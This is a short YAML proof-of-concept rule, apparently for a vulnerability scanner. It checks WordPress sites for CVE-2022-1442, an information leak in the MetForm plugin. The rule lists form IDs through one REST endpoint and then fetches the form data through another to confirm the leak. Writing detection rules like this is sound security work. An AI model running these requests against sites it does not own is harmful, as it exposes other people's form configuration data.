name: poc-yaml-wordpress-metform-cve-2022-1442-info-leak
binding: f2088a16-d8d4-4907-8c8e-70eccd6178ad
manual: true
detail:
    author: z92g(https://github.com/z92g)
    links:
        - https://wpscan.com/vulnerability/9f3fcdd4-9ddc-45d5-a4af-e58634813c2b
    vulnerability:
        id: CT-426012
        level: high
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /wp-json/metform/v1/forms/templates/0
        expression: |
            response.status == 200 && response.body.bstartsWith(bytes("<option value="))
        output:
            search: |-
                '<option value="(?P<id>([0-9]+))" >(?P<title>(.*?))</option>'.bsubmatch(response.body)
            id: search["id"]
            title: search["title"]
    r1:
        request:
            cache: true
            method: GET
            path: /wp-json/metform/v1/forms/get/{{id}}
        expression: |-
            response.status == 200 && response.content_type.contains("application/json") && response.body.bcontains(bytes(title)) && '"success_message":"Thank you! Form submitted successfully."'.bmatches(response.body)
expression: r0() && r1()
